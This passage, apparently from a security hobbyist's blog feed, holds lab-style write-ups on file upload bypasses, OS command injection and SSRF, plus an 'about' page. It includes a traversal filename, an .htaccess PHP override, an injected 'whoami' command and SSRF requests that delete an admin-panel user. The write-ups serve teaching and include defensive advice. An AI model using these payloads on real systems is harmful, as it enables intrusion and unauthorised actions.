  &lt;a href=&#34;#1-content-type-spoofing&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Many applications validate the &lt;code&gt;Content-Type&lt;/code&gt; header sent by the browser but fail to validate the actual file magic bytes.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;The Flaw:&lt;/strong&gt; The server trusts the client-side header &lt;code&gt;image/jpeg&lt;/code&gt; but processes the file as PHP.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Bypass:&lt;/strong&gt; Intercepting the request and changing &lt;code&gt;Content-Type: text/plain&lt;/code&gt; to &lt;code&gt;Content-Type: image/jpeg&lt;/code&gt; allows the upload of arbitrary code.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Impact:&lt;/strong&gt; Complete RCE if the server is configured to execute PHP in the upload directory.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;2-path-traversal-in-filenames&#34;&gt;
  2. Path Traversal in Filenames
  &lt;a href=&#34;#2-path-traversal-in-filenames&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Servers often use the provided filename to determine the save location. If this input is not sanitized, it allows escaping the intended upload directory.&lt;/p&gt;</description>
      <content>
&lt;h2 id=&#34;abstract&#34;&gt;
  Abstract
  &lt;a href=&#34;#abstract&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;File upload vulnerabilities remain a critical vector for Remote Code Execution (RCE). While developers often implement validation mechanisms (MIME type checks, blacklists), these are frequently based on &amp;ldquo;trusting user input.&amp;rdquo; This report documents specific bypass techniques I analyzed during recent research.&lt;/p&gt;

&lt;h2 id=&#34;1-content-type-spoofing&#34;&gt;
  1. Content-Type Spoofing
  &lt;a href=&#34;#1-content-type-spoofing&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Many applications validate the &lt;code&gt;Content-Type&lt;/code&gt; header sent by the browser but fail to validate the actual file magic bytes.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;The Flaw:&lt;/strong&gt; The server trusts the client-side header &lt;code&gt;image/jpeg&lt;/code&gt; but processes the file as PHP.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Bypass:&lt;/strong&gt; Intercepting the request and changing &lt;code&gt;Content-Type: text/plain&lt;/code&gt; to &lt;code&gt;Content-Type: image/jpeg&lt;/code&gt; allows the upload of arbitrary code.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Impact:&lt;/strong&gt; Complete RCE if the server is configured to execute PHP in the upload directory.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;2-path-traversal-in-filenames&#34;&gt;
  2. Path Traversal in Filenames
  &lt;a href=&#34;#2-path-traversal-in-filenames&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Servers often use the provided filename to determine the save location. If this input is not sanitized, it allows escaping the intended upload directory.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique:&lt;/strong&gt; Modifying the filename parameter:

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Content-Disposition: form-data; name=&amp;#34;avatar&amp;#34;; filename=&amp;#34;..%2Fmal.php&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Result:&lt;/strong&gt; The file is saved to &lt;code&gt;/files/mal.php&lt;/code&gt; instead of &lt;code&gt;/files/avatars/mal.php&lt;/code&gt;, potentially bypassing &lt;code&gt;.htaccess&lt;/code&gt; restrictions placed on the images folder.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;3-blacklist-evasion--configuration-overrides&#34;&gt;
  3. Blacklist Evasion &amp;amp; Configuration Overrides
  &lt;a href=&#34;#3-blacklist-evasion--configuration-overrides&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Blacklisting extensions (blocking &lt;code&gt;.php&lt;/code&gt;) is notoriously difficult to maintain.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Apache .htaccess Override:&lt;/strong&gt; If the server allows uploading &lt;code&gt;.htaccess&lt;/code&gt; files, an attacker can redefine executable extensions.

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;apache&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-apache&#34; data-lang=&#34;apache&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AddType application/x-httpd-php .hack&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Effect:&lt;/em&gt; Uploading a shell named &lt;code&gt;shell.hack&lt;/code&gt; will now execute as PHP.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Obfuscation:&lt;/strong&gt; Using alternative extensions (&lt;code&gt;.php5&lt;/code&gt;, &lt;code&gt;.phtml&lt;/code&gt;) or casing (&lt;code&gt;.pHp&lt;/code&gt;) often bypasses weak regex filters.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;
  Conclusion
  &lt;a href=&#34;#conclusion&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Robust file upload security requires a defense-in-depth approach:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Rename files&lt;/strong&gt; on the server (do not use user-provided names).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Validate Magic Bytes&lt;/strong&gt;, not just headers.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Store uploads outside the web root&lt;/strong&gt; or on a separate cloud bucket (S3).&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    <item>
      <title>Research: OS Command Injection Execution Flow</title>
      <link>http://localhost:1313/research/os-command-injection-patterns/</link>
      <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/research/os-command-injection-patterns/</guid>
      <description>&lt;h2 id=&#34;injection-context&#34;&gt;
  Injection Context
  &lt;a href=&#34;#injection-context&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Legacy applications often interface with the operating system using shell wrappers. A common pattern observed in inventory systems involves passing user IDs directly to backend scripts.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable Logic:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stockreport.pl &amp;lt;productID&amp;gt; &amp;lt;storeID&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If the application fails to sanitize &lt;code&gt;productID&lt;/code&gt;, the shell&amp;rsquo;s command separator logic can be abused to chain execution.&lt;/p&gt;

&lt;h2 id=&#34;shell-operator-chaining&#34;&gt;
  Shell Operator Chaining
  &lt;a href=&#34;#shell-operator-chaining&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;The success of an injection depends on how the underlying shell interprets control operators:&lt;/p&gt;</description>
      <content>
&lt;h2 id=&#34;injection-context&#34;&gt;
  Injection Context
  &lt;a href=&#34;#injection-context&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Legacy applications often interface with the operating system using shell wrappers. A common pattern observed in inventory systems involves passing user IDs directly to backend scripts.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vulnerable Logic:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stockreport.pl &amp;lt;productID&amp;gt; &amp;lt;storeID&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If the application fails to sanitize &lt;code&gt;productID&lt;/code&gt;, the shell&amp;rsquo;s command separator logic can be abused to chain execution.&lt;/p&gt;

&lt;h2 id=&#34;shell-operator-chaining&#34;&gt;
  Shell Operator Chaining
  &lt;a href=&#34;#shell-operator-chaining&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;The success of an injection depends on how the underlying shell interprets control operators:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;&amp;amp;&lt;/code&gt; (Background):&lt;/strong&gt; Executes the preceding command and immediately moves to the next.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;;&lt;/code&gt; (Sequence):&lt;/strong&gt; Executes commands strictly sequentially (Linux only).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;||&lt;/code&gt; (OR):&lt;/strong&gt; Executes the second command only if the first fails.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;assessment-case-study&#34;&gt;
  Assessment Case Study
  &lt;a href=&#34;#assessment-case-study&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Target Endpoint:&lt;/strong&gt; &lt;code&gt;/product/stock&lt;/code&gt;
&lt;strong&gt;Method:&lt;/strong&gt; POST&lt;/p&gt;
&lt;p&gt;During analysis, I intercepted a stock check request. The backend expected a numeric &lt;code&gt;productId&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Injected Payload:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;productId=1 &amp;amp; whoami &amp;amp; storeId=1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Execution Flow on Server:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;stockreport.pl 1&lt;/code&gt; (Executed successfully)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;whoami&lt;/code&gt; (Injected command executed)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt; (Remaining argument treated as command, likely failed)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Raw HTTP Response:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/plain; charset=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;peter-3vyaW3&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The response confirmed code execution by returning the current user context (&lt;code&gt;peter-3vyaW3&lt;/code&gt;) alongside the standard application output.&lt;/p&gt;
</content>
    </item>
    <item>
      <title>Research: Server-Side Request Forgery (SSRF) Mechanics</title>
      <link>http://localhost:1313/research/ssrf-exploitation/</link>
      <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/research/ssrf-exploitation/</guid>
      <description>&lt;h2 id=&#34;mechanism-of-action&#34;&gt;
  Mechanism of Action
  &lt;a href=&#34;#mechanism-of-action&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;SSRF occurs when an application fetches a remote resource based on user-supplied URLs without validation. This trust relationship allows an attacker to coerce the server into making requests on their behalf.&lt;/p&gt;

&lt;h2 id=&#34;target-analysis-stock-api&#34;&gt;
  Target Analysis: Stock API
  &lt;a href=&#34;#target-analysis-stock-api&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;The application uses a specific parameter to query an internal stock management API:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /product/stock &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&#34;exploitation-localhost-pivot&#34;&gt;
  Exploitation: Localhost Pivot
  &lt;a href=&#34;#exploitation-localhost-pivot&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;By modifying the &lt;code&gt;stockApi&lt;/code&gt; parameter, we can direct the server to query its own loopback interface (&lt;code&gt;127.0.0.1&lt;/code&gt;). This is critical because many administrative services listen only on localhost to avoid external exposure.&lt;/p&gt;</description>
      <content>
&lt;h2 id=&#34;mechanism-of-action&#34;&gt;
  Mechanism of Action
  &lt;a href=&#34;#mechanism-of-action&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;SSRF occurs when an application fetches a remote resource based on user-supplied URLs without validation. This trust relationship allows an attacker to coerce the server into making requests on their behalf.&lt;/p&gt;

&lt;h2 id=&#34;target-analysis-stock-api&#34;&gt;
  Target Analysis: Stock API
  &lt;a href=&#34;#target-analysis-stock-api&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;The application uses a specific parameter to query an internal stock management API:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /product/stock &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&#34;exploitation-localhost-pivot&#34;&gt;
  Exploitation: Localhost Pivot
  &lt;a href=&#34;#exploitation-localhost-pivot&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;By modifying the &lt;code&gt;stockApi&lt;/code&gt; parameter, we can direct the server to query its own loopback interface (&lt;code&gt;127.0.0.1&lt;/code&gt;). This is critical because many administrative services listen only on localhost to avoid external exposure.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;stockApi=http://localhost/admin&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;
The server responds with the Administrative Interface HTML, which is normally blocked from external IPs.&lt;/p&gt;

&lt;h2 id=&#34;escalation-authorized-action&#34;&gt;
  Escalation: Authorized Action
  &lt;a href=&#34;#escalation-authorized-action&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Once the internal interface is accessible, we can construct authorized requests by predicting URL structures.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;stockApi=http://localhost/admin/delete?username=carlos&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The server executes the request with local privileges, deleting the target user. This demonstrates how SSRF bypasses network-level access controls (firewalls) by utilizing the trusted server as a proxy.&lt;/p&gt;
</content>
    </item>
    <item>
      <title>whoami</title>
      <link>http://localhost:1313/about/</link>
      <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/about/</guid>
      <description>&lt;h2 id=&#34;the-operator&#34;&gt;
  The Operator
  &lt;a href=&#34;#the-operator&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;I am a Security Engineer and hobbyist developer with a focus on &lt;strong&gt;Offensive Security&lt;/strong&gt; and &lt;strong&gt;Infrastructure Automation&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;My background is rooted in general computing and cybersecurity, a passion I have pursued since childhood. Unlike the theoretical approach of academia, I learn by &lt;strong&gt;problem-oriented engineering&lt;/strong&gt;: breaking complex concepts down into bite-sized coding tasks.&lt;/p&gt;

&lt;h2 id=&#34;technical-philosophy&#34;&gt;
  Technical Philosophy
  &lt;a href=&#34;#technical-philosophy&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Code First:&lt;/strong&gt; Theory is necessary, but implementation is proof. I prefer writing a tool to understand a vulnerability over reading a paper about it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Deep Dives:&lt;/strong&gt; I do not settle for high-level abstractions. Whether it&amp;rsquo;s understanding the Windows API for malware development or dissecting network packets for CTI, I aim for the fundamental level.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;core-competencies&#34;&gt;
  Core Competencies
  &lt;a href=&#34;#core-competencies&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Languages:&lt;/strong&gt; Go, C++, Python&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Infrastructure:&lt;/strong&gt; AWS, Proxmox, Docker, Wazuh.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Focus:&lt;/strong&gt; Malware Development, Reverse Engineering, Threat Intelligence, System Architecture&lt;/li&gt;
&lt;/ul&gt;</description>
      <content>
&lt;h2 id=&#34;the-operator&#34;&gt;
  The Operator
  &lt;a href=&#34;#the-operator&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;I am a Security Engineer and hobbyist developer with a focus on &lt;strong&gt;Offensive Security&lt;/strong&gt; and &lt;strong&gt;Infrastructure Automation&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;My background is rooted in general computing and cybersecurity, a passion I have pursued since childhood. Unlike the theoretical approach of academia, I learn by &lt;strong&gt;problem-oriented engineering&lt;/strong&gt;: breaking complex concepts down into bite-sized coding tasks.&lt;/p&gt;

&lt;h2 id=&#34;technical-philosophy&#34;&gt;
  Technical Philosophy
  &lt;a href=&#34;#technical-philosophy&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Code First:&lt;/strong&gt; Theory is necessary, but implementation is proof. I prefer writing a tool to understand a vulnerability over reading a paper about it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Deep Dives:&lt;/strong&gt; I do not settle for high-level abstractions. Whether it&amp;rsquo;s understanding the Windows API for malware development or dissecting network packets for CTI, I aim for the fundamental level.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;core-competencies&#34;&gt;
  Core Competencies
  &lt;a href=&#34;#core-competencies&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Languages:&lt;/strong&gt; Go, C++, Python&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Infrastructure:&lt;/strong&gt; AWS, Proxmox, Docker, Wazuh.&lt;/li&gt;
